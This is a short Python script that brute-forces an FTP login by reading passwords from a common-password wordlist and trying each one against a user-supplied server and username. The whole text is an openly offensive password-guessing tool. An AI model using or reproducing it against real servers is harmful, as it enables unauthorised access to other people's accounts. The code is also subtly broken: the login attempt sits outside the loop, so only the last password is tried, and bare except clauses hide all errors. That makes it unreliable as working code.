#! /usr/bin/python3

import ftplib

server = input("FTP Server: ")

user = input("username: ")

Passwordlist = "/usr/share/wfuzz/wordlist/others/common_pass.txt"

try:
    with open(Passwordlist, 'r') as pw:
        for word in pw:
            word = word.strip ("\r").strip("\n") 
        try:
            ftp = ftplib.FTP(server)
            ftp.login(user, word)
            print("Success! The password is " + word) 

        except:
            print("still trying...")

except:
    print("Wordlist error")